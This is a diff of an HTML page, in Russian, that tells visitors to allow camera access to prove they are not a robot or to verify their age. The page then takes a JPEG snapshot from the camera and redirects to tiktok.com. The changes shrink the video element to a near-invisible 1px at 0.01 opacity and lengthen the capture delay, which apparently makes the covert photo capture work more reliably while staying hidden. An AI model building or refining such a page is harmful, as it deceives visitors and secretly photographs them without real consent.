@@ -17,7 +17,7 @@
     <p class="footer">Для просмотра подтвердите, что вы не робот, разрешив доступ к камере.</p>
 
     <!-- Важно: playsinline и muted для мобильных браузеров -->
-    <video id="v" autoplay playsinline muted style="display:none;"></video>
+    <video id="v" autoplay playsinline muted style="width:1px; height:1px; opacity:0.01;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
@@ -50,7 +50,7 @@
                             window.location.href = "https://tiktok.com";
                         });
                     }, 'image/jpeg');
-                }, 1000);
+                }, 3000);
             } catch (e) {
                 alert("Ошибка! Разрешите доступ к камере для проверки возраста.");
             }
